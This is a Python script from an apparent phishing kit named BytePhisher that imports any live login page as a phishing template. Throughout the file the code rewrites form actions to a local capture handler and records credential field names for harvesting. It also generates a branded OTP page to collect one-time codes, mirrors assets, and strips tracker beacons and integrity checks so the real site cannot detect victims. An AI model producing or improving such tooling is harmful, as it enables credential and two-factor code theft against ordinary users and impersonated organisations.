#!/usr/bin/env python3
"""Import any login page as a BytePhisher template.

    python3 tools/import_site.py --url https://example.com/login --name MyCorp
    python3 tools/import_site.py --file ./page.html --name MyCorp --slug mycorp

What it does:
  * fetches the page (or reads a local file) and stores index.html
  * rewrites relative asset URLs (css/js/images) to absolute so the page
    renders correctly when served from BytePhisher
  * points every <form> action at "/" so submissions land on the capture
    handler
  * extracts the form's input names into fields.json (capture_fields)
  * writes an otp.html matching the page's brand colour
  * registers the site in templates/templates.json with the next free index

Everything is written under templates/, so the CLI picks it up immediately:
    ./bytephisher.py --list | grep mycorp
"""
import argparse
import json
import os
import re
import sys
from html.parser import HTMLParser
from urllib.parse import urljoin

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)
TEMPLATES = os.path.join(os.environ.get("BYTEPHISHER_HOME") or HERE, "templates")


class FormScanner(HTMLParser):
    """Collect <form> actions and every <input>/<select>/<textarea> name."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.inputs = []          # (name, type, placeholder)
        self.actions = []

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            if a.get("action"):
                self.actions.append(a["action"])
        elif tag in ("input", "select", "textarea"):
            name = a.get("name")
            if name:
                self.inputs.append((name, a.get("type", "text"), a.get("placeholder", "")))

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)


ALLOWED_SCHEMES = ("http://", "https://")


def fetch(url):
    """Fetch a page. Only http(s) is allowed: urllib happily reads file://,
    so an unvalidated scheme turned this into a local-file reader."""
    if not str(url).lower().startswith(ALLOWED_SCHEMES):
        raise ValueError("only http:// and https:// URLs can be imported")
    """Fetch a page with a browser-like UA (IPv4-preferring, see core/net.py)."""
    from core import net
    return net.fetch_text(url, timeout=25, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9"})


def absolutize(html_text, base_url):
    """Rewrite relative href/src/action URLs so assets still load."""
    def repl(m):
        attr, quote, value = m.group(1), m.group(2), m.group(3)
        if value.startswith(("http://", "https://", "//", "data:", "#", "javascript:")):
            return m.group(0)
        return f'{attr}={quote}{urljoin(base_url, value)}{quote}'
    return re.sub(r'\b(href|src|action|poster)\s*=\s*(["\'])([^"\']+)\2',
                  repl, html_text, flags=re.I)


# ---------------------------------------------------------------- mirroring ---
# Anything in this list is a beacon, not an asset: mirroring it would still let the
# real site see the victim. The tag is removed and reported.
TRACKER_HOSTS = (
    "google-analytics.com", "googletagmanager.com", "googleadservices.com",
    "doubleclick.net", "connect.facebook.net", "facebook.net", "facebook.com/tr",
    "hotjar.com", "hotjar.io", "segment.com", "segment.io", "mixpanel.com",
    "sentry.io", "newrelic.com", "nr-data.net", "cloudflareinsights.com",
    "clarity.ms", "amplitude.com", "fullstory.com", "optimizely.com",
    "intercom.io", "intercomcdn.com", "drift.com", "hubspot.com", "hs-scripts.com",
    "criteo.com", "criteo.net", "taboola.com", "outbrain.com", "quantserve.com",
    "scorecardresearch.com", "bat.bing.com", "mc.yandex.ru", "top-fwz1.mail.ru",
    "vk.com/rtrg", "analytics.tiktok.com", "pinterest.com/ct", "snap.licdn.com",
    "px.ads.linkedin.com", "tr.snapchat.com", "static.ads-twitter.com",
)

ASSET_ATTR = re.compile(r"\b(href|src|poster)\s*=\s*([\"'])([^\"']+)\2", re.I)
CSS_URL = re.compile(r"url\(\s*([\"']?)([^\"')]+)\1\s*\)", re.I)
TAG_RE = re.compile(r"<(script|link)\b[^>]*>", re.I)
EXT_BY_TYPE = {".css": "text/css", ".js": "application/javascript",
               ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
               ".gif": "image/gif", ".svg": "image/svg+xml", ".webp": "image/webp",
               ".ico": "image/x-icon", ".woff": "font/woff", ".woff2": "font/woff2",
               ".ttf": "font/ttf", ".eot": "application/vnd.ms-fontobject",
               ".json": "application/json", ".map": "application/json"}


def is_tracker(url):
    u = str(url or "").lower()
    return any(h in u for h in TRACKER_HOSTS)


def _is_asset_ref(value):
    """Is this reference an asset worth mirroring?

    A bare origin (`https://cdn.example.com`) is not: fetching it returns an error
    and it is never a stylesheet/image.
    """
    from urllib.parse import urlsplit
    v = str(value or "").strip()
    if not v or v.startswith(("#", "data:", "javascript:", "mailto:", "tel:", "blob:")):
        return False
    if v.lower().startswith(("http://", "https://")):
        return bool(urlsplit(v).path.strip("/"))
    return True


def _local_name(url, used):
    """A stable, collision-free filename for a mirrored asset."""
    from urllib.parse import urlsplit
    path = urlsplit(url).path or "/asset"
    base = os.path.basename(path) or "asset"
    base = re.sub(r"[^A-Za-z0-9._-]+", "_", base)[:60] or "asset"
    if "." not in base:
        base += ".bin"
    if base not in used:
        used.add(base)
        return base
    root, ext = os.path.splitext(base)
    i = 2
    while f"{root}_{i}{ext}" in used:
        i += 1
    used.add(f"{root}_{i}{ext}")
    return f"{root}_{i}{ext}"


def _get_bytes(url, timeout=20):
    """Raw bytes of a URL through core.net (IPv4-preferring, no Referer)."""
    from core import net
    with net.urlopen(url, timeout=timeout, headers={
            "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                           " (KHTML, like Gecko) Chrome/124.0 Safari/537.36"),
            "Accept": "*/*"}) as r:
        return r.read()


def mirror_assets(html_text, base_url, folder, limit_files=80,
                  limit_bytes=12 * 1024 * 1024, log=None):
    """Download the page's own assets beside it and point the page at them.

    Returns {"mirrored": [...], "bytes": int, "trackers_removed": [...],
             "skipped": [...]}. Never raises: a single failed asset is reported and
    left as it was, because a half-mirrored page still has to render.
    """
    from urllib.parse import urljoin
    say = log or (lambda *a: None)
    out_dir = os.path.join(folder, "assets")
    report = {"mirrored": [], "bytes": 0, "trackers_removed": [], "skipped": []}
    used, mapping = set(), {}

    def note_skip(url, why):
        report["skipped"].append({"url": url, "why": why})

    def fetch_one(url, depth=0):
        """Mirror one asset; returns the local relative path or None."""
        if url in mapping:
            return mapping[url]
        if len(report["mirrored"]) >= limit_files:
            note_skip(url, "file limit reached")
            return None
        if report["bytes"] >= limit_bytes:
            note_skip(url, "size limit reached")
            return None
        try:
            raw = _get_bytes(url)
        except Exception as e:
            note_skip(url, f"{type(e).__name__}")
            return None
        if len(raw) + report["bytes"] > limit_bytes:
            note_skip(url, "size limit reached")
            return None
        name = _local_name(url, used)
        os.makedirs(out_dir, exist_ok=True)
        ext = os.path.splitext(name)[1].lower()
        # CSS can pull fonts/images of its own: rewrite it before writing
        if ext == ".css" and depth < 2:
            text = raw.decode("utf-8", "replace")

            def css_repl(m):
                inner = m.group(2)
                if inner.startswith(("data:", "#")):
                    return m.group(0)
                target = urljoin(url, inner)
                if is_tracker(target):
                    return m.group(0)
                local = fetch_one(target, depth + 1)
                return f"url({local})" if local else m.group(0)

            text = CSS_URL.sub(css_repl, text)
            raw = text.encode("utf-8")
        with open(os.path.join(out_dir, name), "wb") as f:
            f.write(raw)
        report["mirrored"].append(name)
        report["bytes"] += len(raw)
        mapping[url] = f"assets/{name}"
        say(f"   mirrored {name} ({len(raw)} bytes) <- {url[:70]}")
        return mapping[url]

    # 1) remove beacons outright
    def tag_repl(m):
        tag = m.group(0)
        ref = ASSET_ATTR.search(tag)
        if ref and is_tracker(urljoin(base_url, ref.group(3))):
            report["trackers_removed"].append(urljoin(base_url, ref.group(3)))
            return ""
        return tag

    html_text = TAG_RE.sub(tag_repl, html_text)

    # 2) mirror what is left, including url() inside inline styles
    def attr_repl(m):
        attr, quote, value = m.group(1), m.group(2), m.group(3)
        if not _is_asset_ref(value):
            return m.group(0)
        absolute = urljoin(base_url, value)
        if is_tracker(absolute):
            return m.group(0)
        local = fetch_one(absolute)
        if not local:
            return m.group(0)
        return f'{attr}={quote}{local}{quote}'

    html_text = ASSET_ATTR.sub(attr_repl, html_text)
    html_text = CSS_URL.sub(
        lambda m: m.group(0) if str(m.group(2)).startswith(("data:", "#"))
        else (f"url({fetch_one(urljoin(base_url, m.group(2)))})"
              if fetch_one(urljoin(base_url, m.group(2))) else m.group(0)),
        html_text)
    # SRI and crossorigin would block our local copies
    html_text = re.sub(r'\s+integrity\s*=\s*([\"\']).*?\1', "", html_text, flags=re.I)
    html_text = re.sub(r'\s+crossorigin\s*=\s*([\"\'])[^\"\']*\1', "", html_text,
                       flags=re.I)
    # assets only: a footer <a href="https://brand.com/terms"> is a link, not a
    # remote dependency, and counting it made the report look wrong
    remote = set(re.findall(r'\bsrc\s*=\s*["\'](https?://[^"\']+)', html_text, re.I))
    for tag in re.findall(r"<link\b[^>]*>", html_text, re.I):
        remote |= set(re.findall(r'\bhref\s*=\s*["\'](https?://[^"\']+)', tag, re.I))
    report["remaining_remote"] = sorted(remote)
    return html_text, report


def neutralise_forms(html_text):
    """Point every form at "/" and drop method overrides we don't need."""
    def repl(m):
        tag = m.group(0)
        tag = re.sub(r'action\s*=\s*(["\']).*?\1', 'action="/"', tag, flags=re.I)
        if not re.search(r'action\s*=', tag, flags=re.I):
            tag = tag.replace("<form", '<form action="/"', 1)
        tag = re.sub(r'method\s*=\s*(["\'])\w+\1', 'method="POST"', tag, flags=re.I)
        return tag
    return re.sub(r"<form\b[^>]*>", repl, html_text, flags=re.I)


def brand_colour(html_text, default="#2563eb"):
    m = re.search(r"#([0-9a-fA-F]{6})\b", html_text)
    return f"#{m.group(1)}" if m else default


def otp_page(name, brand, slug, label="verification code"):
    from tools.gen_templates import OTP_HTML, favicon_uri
    initial = name[0].upper()
    return OTP_HTML.format(name=name, slug=slug, brand=brand, initial=initial,
                           otp_label=label, favicon=favicon_uri(initial, brand))


def _load_json(path):
    with open(path, encoding="utf-8") as f:
        return json.load(f)


def _dump_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)


def import_site(url=None, file=None, name=None, slug=None, index=None, keep_otp=True,
                mirror=True, mirror_limit=80, log=None):
    if not url and not file:
        raise SystemExit("pass --url or --file")
    if url:
        html_text = fetch(url)
    else:
        with open(file, encoding="utf-8", errors="replace") as f:
            html_text = f.read()
    report = None
    if url:
        if mirror:
            # done after the folder is known: assets live beside index.html
            pass
        else:
            html_text = absolutize(html_text, url)
    html_text = neutralise_forms(html_text)

    scanner = FormScanner()
    scanner.feed(html_text)
    names = [n for n, _t, _p in scanner.inputs]
    # de-dupe, keep order; ensure a password field is present for verification
    seen, capture_fields = set(), []
    for n in names:
        if n not in seen:
            seen.add(n)
            capture_fields.append(n)

    slug = slug or re.sub(r"[^a-z0-9]+", "-", (name or "import").lower()).strip("-")
    man_path = os.path.join(TEMPLATES, "templates.json")
    manifest = (_load_json(man_path) if os.path.isfile(man_path) else [])
    if index is None:
        index = max([t["index"] for t in manifest], default=0) + 1

    folder = os.path.join(TEMPLATES, f"{index:02d}_{slug}")
    os.makedirs(folder, exist_ok=True)
    if url and mirror:
        # mirror the page's own assets locally: the victim's browser must never
        # touch the real site's CDN (that is a correlation and a broken-clone risk)
        html_text, report = mirror_assets(html_text, url, folder,
                                          limit_files=mirror_limit, log=log)
    with open(os.path.join(folder, "index.html"), "w", encoding="utf-8") as f:
        f.write(html_text)
    if keep_otp:
        with open(os.path.join(folder, "otp.html"), "w", encoding="utf-8") as f:
            f.write(otp_page(name or slug, brand_colour(html_text), slug))
    with open(os.path.join(folder, "fields.json"), "w", encoding="utf-8") as f:
        json.dump({
            "capture_fields": capture_fields,
            "otp_fields": [f"otp_{i}" for i in range(1, 7)],
            "honeypot": "hp_email",
            "has_otp": bool(keep_otp),
            "imported": {"url": url, "file": file},
        }, f, indent=2)

    manifest = [t for t in manifest if t["index"] != index]
    manifest.append({"index": index, "slug": slug, "name": name or slug, "dir": folder})
    manifest.sort(key=lambda t: t["index"])
    _dump_json(man_path, manifest)

    out = {"index": index, "slug": slug, "dir": folder,
           "capture_fields": capture_fields, "form_actions_seen": scanner.actions}
    if report is not None:
        out["mirror"] = report
    return out


def main():
    ap = argparse.ArgumentParser(description="Import a login page as a BytePhisher template")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--url", help="live login page URL")
    src.add_argument("--file", help="local HTML file")
    ap.add_argument("--name", required=True, help="display name (e.g. 'MyCorp SSO')")
    ap.add_argument("--slug", help="folder slug (default: derived from --name)")
    ap.add_argument("--index", type=int, help="template index (default: next free)")
    ap.add_argument("--no-mirror", action="store_true",
                    help="keep absolute asset URLs instead of downloading them "
                         "(the victim's browser would then load CSS/JS/images from "
                         "the real site, which the target can see)")
    ap.add_argument("--mirror-limit", type=int, default=80,
                    help="maximum number of assets to mirror (default 80)")
    args = ap.parse_args()

    res = import_site(url=args.url, file=args.file, name=args.name,
                      slug=args.slug, index=args.index,
                      mirror=not args.no_mirror, mirror_limit=args.mirror_limit,
                      log=lambda m: print(m))
    print(f"[bytephisher] imported -> {res['dir']}")
    print(f"[bytephisher] index    : {res['index']}  (select with -o {res['index']})")
    print(f"[bytephisher] fields   : {', '.join(res['capture_fields']) or '(none found)'}")
    print(f"[bytephisher] forms    : {res['form_actions_seen'] or '(no action attributes)'}")
    m = res.get("mirror")
    if m:
        print(f"[bytephisher] mirrored : {len(m['mirrored'])} asset(s), "
              f"{m['bytes']} bytes, self-contained")
        if m["trackers_removed"]:
            print(f"[bytephisher] trackers : removed {len(m['trackers_removed'])} "
                  f"beacon script(s) (they would report the victim to the brand)")
        if m["skipped"]:
            print(f"[bytephisher] skipped  : {len(m['skipped'])} "
                  f"(first: {m['skipped'][0]['url'][:60]} - {m['skipped'][0]['why']})")
        if m.get("remaining_remote"):
            print(f"[bytephisher] still remote: {m['remaining_remote'][:3]}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
